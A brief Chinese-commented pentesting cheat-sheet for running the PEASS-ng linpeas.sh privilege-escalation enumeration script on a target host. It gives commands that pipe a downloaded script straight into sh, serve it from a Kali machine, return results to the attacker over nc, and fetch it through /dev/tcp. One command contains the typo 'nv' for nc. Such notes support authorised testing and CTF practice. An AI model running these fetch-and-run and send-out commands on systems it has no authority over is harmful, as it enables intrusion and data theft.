# [PEASS-ng](https://github.com/carlospolop/PEASS-ng)

```bash
# 从云端下载脚本执行
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 从本地下载脚本执行
Kali:    $ sudo python3 -m http.server 80
Machine: $ curl $kali_ip/linpeas.sh | sh

# 把运行结果传回本地
Kali:    $ sudo nc -lvnp 81 | tee result/linpeas.txt, less -r result/linpeas.txt
Machine: $ curl $kali_ip/linpeas.sh | sh | nc $kali_ip 81

# curl命令不可用的情况，用nc
Kali:    $ sudo nv -lvnp 80 < linpeas.sh
Machine: $ cat < /dev/tcp/$kali_ip/80 | sh
```
